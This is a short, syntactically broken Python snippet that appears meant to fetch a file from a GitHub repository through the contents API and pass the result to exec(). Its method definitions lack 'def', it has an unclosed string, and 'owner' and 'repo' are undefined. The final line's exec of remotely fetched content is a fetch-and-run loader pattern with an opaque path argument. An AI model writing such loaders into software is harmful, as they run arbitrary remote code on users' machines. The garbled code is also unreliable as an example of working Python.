import urllib.request
import json
import base64
import uuid

class u:
  @classmethod
  GithubAPI(cls,path):
    path = path.split("|)
    cache_buster = uuid.uuid4().hex
    url = f"https://api.github.com/repos/{owner}/{repo}/contents/{path}?ref=main&cb={cache_buster}"

  @classmethod
  readGithubFile(cls,path):
    print(path)

exec(u.readGithubFile("db0bc|pm|pm"))
